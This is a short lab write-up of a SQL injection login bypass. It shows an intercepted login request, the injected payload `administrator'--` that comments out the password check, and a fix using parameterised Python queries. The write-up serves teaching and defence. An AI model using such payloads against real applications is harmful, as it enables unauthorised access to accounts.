# SQL Injection - Login bypass

## Goal:
This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

---

## Process

### 1. Login with random username and password
Username: user
Password: password

### 2. Intercept the login request using Burp Suite 
```http
POST /login HTTP/2
...
csrf=jlp1tF4FYmhhmdJpIEGytS4FmMLNudbB&username=user&password=password
```

### 3. Modify the username and password parameter to inject SQL
**Injected Payload:**

`csrf=lJFu1mCFnL7NMOgl664WX9YL1NddLmCW&username=administrator'--&password=''`

### 4. Explanation

`username=administrator` attempts to log in as administrator, `'` closes the string in the SQL query. `--` comments out the rest of the query and bypasses the password check.

**The SQL query becomes:**

```sql
SELECT * FROM users WHERE username = '" + username + "' --' AND password = '" + password +
```

This results in a successful login without verifying the password.

---

## How to fix this vulnerability

**Use Parameterized Queries (Prepared Statements)**

Never build SQL statements by directly concatenating user input. 

Vulnerable SQL query:
```sql
SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'
```

Safe version using prepared statements (python script):
```py
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

Parameterised query treats user input as data, which prevents injection.

---

## Reflection

- Learnt how SQL injection can bypass login by manipulating input and commenting out the password check.
- Gained insight into securing authentication logic through **proper input handling**.

---

## Notes
Different python libraries use different placeholder syntax:

sqlite3 uses `?`

mysql-connector-python, psycopg2 use `%s`

---